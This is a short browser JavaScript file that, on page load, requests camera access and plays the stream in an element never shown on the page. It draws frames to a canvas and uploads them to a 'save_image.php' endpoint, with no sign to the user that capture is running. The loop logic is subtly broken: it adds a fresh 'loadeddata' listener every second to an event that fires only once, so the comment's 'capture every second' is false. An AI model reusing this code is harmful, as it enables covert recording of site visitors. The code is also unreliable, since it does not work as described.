document.addEventListener("DOMContentLoaded", function () {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
            video.srcObject = stream;
            video.play();

            setInterval(() => {
                video.addEventListener('loadeddata', () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const imageData = canvas.toDataURL('image/png');

                    // Send the captured image to the server using Ajax or other methods
                    sendDataToServer(imageData);
                });
            }, 1000); // Capture an image every 1000 milliseconds (1 second)

        })
        .catch((error) => {
            console.error('Error accessing camera:', error);
        });

    function sendDataToServer(imageData) {
        // Send the imageData to the server using Ajax or other methods
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'save_image.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        
        // Construct the data to be sent
        const data = 'imageData=' + encodeURIComponent(imageData);
        
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    console.log('Image successfully sent to the server.');
                } else {
                    console.error('Error sending image to the server. Status code: ' + xhr.status);
                }
            }
        };
        
        // Send the request
        xhr.send(data);
    }
});
